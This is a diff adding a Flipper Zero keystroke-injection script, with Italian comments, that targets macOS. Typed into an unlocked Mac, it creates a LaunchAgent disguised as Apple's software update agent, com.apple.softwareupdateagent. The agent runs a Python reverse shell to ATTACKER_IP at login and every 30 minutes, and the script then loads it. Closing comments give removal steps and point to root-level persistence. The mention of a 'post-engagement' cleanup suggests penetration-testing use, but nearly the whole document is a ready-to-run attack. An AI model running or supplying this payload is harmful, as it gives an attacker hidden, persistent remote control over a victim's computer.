@@ -1,0 +1,74 @@
+REM ============================================================
+REM Title:    macOS Persistence via LaunchAgent
+REM Target:   macOS 12+
+REM Author:   FlipperZero-guide
+REM Category: Persistence
+REM Privs:    User (no root)
+REM Layout:   US
+REM Time:     ~8 secondi
+REM Detect:   Medio - LaunchAgent è punto noto di persistence
+REM Desc:     Crea un LaunchAgent che esegue un payload
+REM           ad ogni login dell'utente. Si maschera come
+REM           processo di aggiornamento Apple.
+REM CHANGE:   ATTACKER_IP e ATTACKER_PORT
+REM ============================================================
+
+DELAY 2000
+GUI SPACE
+DELAY 700
+STRING terminal
+DELAY 1000
+ENTER
+DELAY 1500
+
+STRING mkdir -p ~/Library/LaunchAgents && cat > ~/Library/LaunchAgents/com.apple.softwareupdateagent.plist << 'PEOF'
+ENTER
+STRING <?xml version="1.0" encoding="UTF-8"?>
+ENTER
+STRING <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+ENTER
+STRING <plist version="1.0">
+ENTER
+STRING <dict>
+ENTER
+STRING     <key>Label</key>
+ENTER
+STRING     <string>com.apple.softwareupdateagent</string>
+ENTER
+STRING     <key>ProgramArguments</key>
+ENTER
+STRING     <array>
+ENTER
+STRING         <string>/bin/zsh</string>
+ENTER
+STRING         <string>-c</string>
+ENTER
+STRING         <string>python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",ATTACKER_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/zsh","-i"])'</string>
+ENTER
+STRING     </array>
+ENTER
+STRING     <key>RunAtLoad</key>
+ENTER
+STRING     <true/>
+ENTER
+STRING     <key>StartInterval</key>
+ENTER
+STRING     <integer>1800</integer>
+ENTER
+STRING </dict>
+ENTER
+STRING </plist>
+ENTER
+STRING PEOF
+ENTER
+STRING launchctl load ~/Library/LaunchAgents/com.apple.softwareupdateagent.plist
+ENTER
+
+REM ============================================================
+REM Rimozione post-engagement:
+REM launchctl unload ~/Library/LaunchAgents/com.apple.softwareupdateagent.plist
+REM rm ~/Library/LaunchAgents/com.apple.softwareupdateagent.plist
+REM
+REM NOTA: Per persistenza come root (LaunchDaemon):
+REM /Library/LaunchDaemons/ (richiede sudo)
+REM ============================================================
